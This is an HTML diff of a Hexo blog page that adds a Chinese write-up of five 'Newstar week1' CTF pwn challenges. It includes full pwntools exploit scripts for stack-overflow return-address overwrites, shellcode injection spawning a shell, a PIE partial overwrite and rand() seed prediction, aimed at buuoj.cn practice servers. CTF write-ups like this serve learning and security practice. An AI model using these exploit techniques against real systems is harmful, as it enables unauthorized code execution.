@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/about/"/>
+  <link rel="canonical" href="http://example.com/2024/08/30/newstar-week1/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,20 +33,22 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>关于 - Hexo</title>
-  <meta name="keywords" content="null">
+  <title>Newstar week1 - Hexo</title>
+  <meta name="keywords" content="write up,复现,null">
   <meta desc name="description" content="Hexo - John Doe - Hexo">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Newstar week1">
+<meta property="og:url" content="http://example.com/2024/08/30/Newstar-week1/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="下面写关于自己的内容">
+<meta property="og:description" content="Ret2text很简单的栈溢出，checksec一下 64位，没开pie，运行一下看看没什么特殊的，直接丢ida里反编译看一眼很明显的栈溢出，溢出大小为0x20+0x8，直接开始简单的脚本攻击以下是exp 1234567891011121314151617from pwn import *#p &#x3D; process([&#x27;.&#x2F;Ret2text&#x27;])p &#x3D; remote(&amp;#x27">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2024-08-19T15:42:32.305Z">
-<meta property="article:modified_time" content="2024-08-19T15:42:32.305Z">
+<meta property="article:published_time" content="2024-08-30T01:29:50.981Z">
+<meta property="article:modified_time" content="2024-09-03T02:43:29.715Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="复现">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2064,6 +2066,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
         <li><a id="s-comment" class="fa-solid fa-comments fa-fw" target="_self"  href="/" onclick="return false;" title="comment"></a></li>
         
+          <li><a id="s-toc" class="s-toc fa-solid fa-list fa-fw" target="_self"  href="/" onclick="return false;" title="toc"></a></li>
+        
       </ul>
     </div>
 		<div class="nav-main">
@@ -2323,7 +2327,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="none" class='cover-wrapper docs search' style="display: none;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://s2.loli.net/2024/08/20/XznLVif8uGoETrU.jpg"></div>
 
@@ -2393,9 +2397,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="safearea">
         <div class="body-wrapper">
           
-<div id="l_main" class=' no_sidebar'>
-  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-docs" id="docs" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/about/index.html">
+<div id="l_main" class=''>
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/30/Newstar-week1/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Hexo">
   </span>
@@ -2415,16 +2419,78 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
     
-      <span hidden itemprop="name headline">
+      <h1 class="title" itemprop="name headline">
+        Newstar week1
+      </h1>
+      <div class='new-meta-box'>
         
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/write-up/">write up</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/write-up/" itemprop="url"><span itemprop="name">write up</span></a>
       </span>
+    
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-08-30T09:29:50+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Aug 30, 2024</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
     
   </div>
 
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>下面写关于自己的内容</p>
+    <p><a name="nDxJs"></a></p>
+<h2 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h2><p>很简单的栈溢出，checksec一下</p>
+<p><img src="https://s2.loli.net/2024/08/30/PDwLCc2p96JdW8V.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/08/30/PDwLCc2p96JdW8V.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />64位，没开pie，运行一下看看<br /><img src="https://s2.loli.net/2024/08/30/Zto5VqRgvSbkFjO.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/08/30/Zto5VqRgvSbkFjO.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />没什么特殊的，直接丢ida里反编译看一眼<br /><img src="https://s2.loli.net/2024/08/30/mupfAEiaeXP9HIg.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/08/30/mupfAEiaeXP9HIg.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://s2.loli.net/2024/08/30/xUGsQduclROWNE1.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/08/30/xUGsQduclROWNE1.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />很明显的栈溢出，溢出大小为0x20+0x8，直接开始简单的脚本攻击<br /><img src="https://s2.loli.net/2024/08/30/F9yeAmL6nHhEMQB.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/08/30/F9yeAmL6nHhEMQB.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />以下是exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p = process([&#x27;./Ret2text&#x27;])</span><br><span class="line">p = remote(&#x27;node5.buuoj.cn&#x27;, 29795)</span><br><span class="line">#p64中输入十六进制的值，即进行变量覆写</span><br><span class="line">#p.recvuntil(&quot;name:\n&quot;)</span><br><span class="line">#payload=b&#x27;1956681178&#x27;</span><br><span class="line">#p.sendline(payload)</span><br><span class="line">#p.recvuntil(&quot;enge\n&quot;)</span><br><span class="line">system_binsh_addr=0x4011FB</span><br><span class="line">sh=0x08048670</span><br><span class="line">padding=0x20+0x8</span><br><span class="line">payload=b&#x27;a&#x27; * padding + p64(system_binsh_addr)</span><br><span class="line">p.recvuntil(&#x27;magic&#x27;)</span><br><span class="line">p.send(payload)</span><br><span class="line">#p.recv()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a name="sSjlx"></a></p>
+<h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>很简单的ret2shellcode，运行一下看看先<br /><img src="https://s2.loli.net/2024/09/01/l7Vw4MgRDho6Hj5.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/l7Vw4MgRDho6Hj5.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />和上一题怎么一样，差点以为下错文件，checksec一下吧<br /><img src="https://s2.loli.net/2024/09/01/myLAtKYvueHjS2X.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/myLAtKYvueHjS2X.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />OK呀，直接给我打开ida反编译看看怎么回事<br /><img src="https://s2.loli.net/2024/09/01/yfhp2HL1T4J6DnN.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/yfhp2HL1T4J6DnN.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />没有后门函数，但开辟了一段可执行段，可以往可执行段里写shellcode，很不错，那就直接开始吧！<br /><img src="https://s2.loli.net/2024/09/01/D6fnUVKErMgWsaI.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/D6fnUVKErMgWsaI.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />以下是exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">context (os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;140&#x27;]</span><br><span class="line"></span><br><span class="line">pwnfile = &#x27;./ezshellcode&#x27;</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">#libc = ELF(&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">#io = process(pwnfile)</span><br><span class="line">p = remote(&#x27;node5.buuoj.cn&#x27;,27667)</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line">pay = asm(shellcraft.sh())			#自动生成shellcode</span><br><span class="line">#pay = b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span><br><span class="line">#64位不可见shellcode</span><br><span class="line">p.recvuntil(&#x27;magic\n&#x27;)</span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a name="PAz9m"></a></p>
+<h2 id="Newstart-shop"><a href="#Newstart-shop" class="headerlink" title="Newstart_shop"></a>Newstart_shop</h2><p>整数溢出，checksec后，丢ida里反编译瞧瞧，发现是一堆的函数，点进去看看<br /><img src="https://s2.loli.net/2024/09/01/2ZhzltvmBQsrTPj.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/2ZhzltvmBQsrTPj.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://s2.loli.net/2024/09/01/nh1JHYlrCijP6Va.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/nh1JHYlrCijP6Va.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://s2.loli.net/2024/09/01/1njJWtDy7HoVheI.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/1njJWtDy7HoVheI.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png">可以看到在判断的时候，是unsigned int类型，所以我们可以让money变成负数后，判断时就足够大了<br /><img src="https://s2.loli.net/2024/09/01/i8k6PWjMNDz2UZQ.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/i8k6PWjMNDz2UZQ.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />这个函数刚好可以做到，直接执行<br /><img src="https://s2.loli.net/2024/09/01/CGKk6jho8P5WzNA.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/CGKk6jho8P5WzNA.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://s2.loli.net/2024/09/01/82gpfe9sTRQ3ajB.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/82gpfe9sTRQ3ajB.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><img src="https://s2.loli.net/2024/09/01/zo4rHYQTBL9EdFf.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/zo4rHYQTBL9EdFf.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br><a name="AZK8P"></a></p>
+<h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><p>checksec一下，基本上能开的保护都开了<br /><img src="https://s2.loli.net/2024/09/01/x2rRgEkNI5ZYzQK.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/x2rRgEkNI5ZYzQK.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />运行一下看看<br /><img src="https://s2.loli.net/2024/09/01/pZI4RM9LgxPGnk2.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/pZI4RM9LgxPGnk2.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />运行一下也没什么东西，进ida里看看<br /><img src="https://s2.loli.net/2024/09/01/QgGRI93Ywe15rXy.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/QgGRI93Ywe15rXy.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://s2.loli.net/2024/09/01/aDGspF81fPeYKhv.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/aDGspF81fPeYKhv.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />仔细看看有后门函数，正好也给了栈溢出的机会<br /><img src="https://s2.loli.net/2024/09/01/kdHeF5bRvXJBzno.webp" class="lazyload" data-srcset="https://s2.loli.net/2024/09/01/kdHeF5bRvXJBzno.webp" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />由于开了pie，基地址随机，只有后三位是固定的，所以可以通过栈溢出将返回地址后四位修改，看很多大佬的博客是通过爆破打通，这里我发现用64-68都打不通，69-6c甚至不需要爆破就能打通，由于read为程序最后一个函数，也调试不出来，希望有懂的大佬可以教教我<br />以下是exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">from pwn import *</span><br><span class="line">p=process(&#x27;./aaa&#x27;)</span><br><span class="line">#p = remote(&#x27;node4.buuoj.cn&#x27;,25970)</span><br><span class="line">context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">#p.sendafter(b&quot;A nice try to break pie!!!&quot;, b&#x27;\x00&#x27;*0x28 + p8(0x6c))</span><br><span class="line">p.sendafter(b&quot;A nice try to break pie!!!&quot;, b&#x27;\x00&#x27;*0x28 + b&#x27;d&#x27;)</span><br><span class="line">#print(p.sendline(b&#x27;cat flag&#x27;))</span><br><span class="line">p.interactive()</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)</span><br><span class="line">p=process(&#x27;./aaa&#x27;)</span><br><span class="line">#p=remote(&#x27;node5.buuoj.cn&#x27;,26568)</span><br><span class="line">payload=b&#x27;a&#x27;*(32+8)+b&#x27;\x69&#x27;</span><br><span class="line">p.sendlineafter(&#x27;!&#x27;,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a name="CIlto"></a></p>
+<h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from ctypes import *</span><br><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">#p=process(&#x27;./aaa&#x27;)</span><br><span class="line">p = remote(&#x27;node5.buuoj.cn&#x27;,29112)</span><br><span class="line">context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">clibc.srand(clibc.time(0))</span><br><span class="line">v =clibc.rand()</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(b&quot;can you guess the number?&quot;, str(v).encode())</span><br><span class="line"> </span><br><span class="line">p.sendline(b&#x27;/bin/sh&#x27;)</span><br><span class="line">p.sendline(b&#x27;cat flag&#x27;)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
   </div>
   
@@ -2448,6 +2514,77 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class='article-meta' id="bottom">
     <div class='new-meta-box'>
       
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-09-03T10:43:29+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Sep 3, 2024</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/write-up/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>write up</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>复现</p></a></div>
+  <span hidden itemprop="keywords">write up 复现</span>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/08/30/Newstar-week1/&title=Newstar week1 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/08/30/Newstar-week1/&title=Newstar week1 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2024/08/30/Newstar-week1/&title=Newstar week1 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
     </div>
     <!-- Custom Files bottomMeta begin -->
     
@@ -2458,6 +2595,31 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   
 
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2024/09/01/Newstar_week2/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Aug 30, 2024</p>
+          <p class='content'>Newstar_week2ret2libc简单的看看开了什么保护吧，没开pie
+
+运行一下看看
+
+丢ida里反编译看看，可以栈溢出，很普通的ret2libc
+
+
+以下是exp
+123456789...</p>
+        </a>
+      
+      
+        <a class='next' href='/2024/08/19/PWN-orange/'>
+          <p class='title'>Hello Hnu！<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+netcat通过题目不难看出，nc 一下即可
+shellcode拿到题目第一步 checksec 一下打开的栈不可执行，丢 ida 里看看产生了一段可执行段，进 gdb 验证一下很明显产生了一...</p>
+        </a>
+      
+    </div>
   
   <!-- Custom Files postEnd begin-->
   
@@ -2470,7 +2632,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/about/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2024/08/30/Newstar-week1/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2488,8 +2650,35 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
 
+  
+    
+    
+      
+    
+  
+
 
 <div class="widget-sticky pjax">
+
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ret2text"><span class="toc-text">Ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezshellcode"><span class="toc-text">ezshellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Newstart-shop"><span class="toc-text">Newstart_shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#p1eee"><span class="toc-text">p1eee</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Random"><span class="toc-text">Random</span></a></li></ol>
+    </div>
+  </section>
+
+  
 
 </div>
 
@@ -2545,7 +2734,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -3082,7 +3271,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"关于","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/about/index.html"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/about/index.html","wordCount":0,"datePublished":"2024-08-19T15:42:32.305Z","dateModified":"2024-08-19T15:42:32.305Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/write-up/","name":"write up"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/08/30/Newstar-week1/","name":"Newstar week1"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John 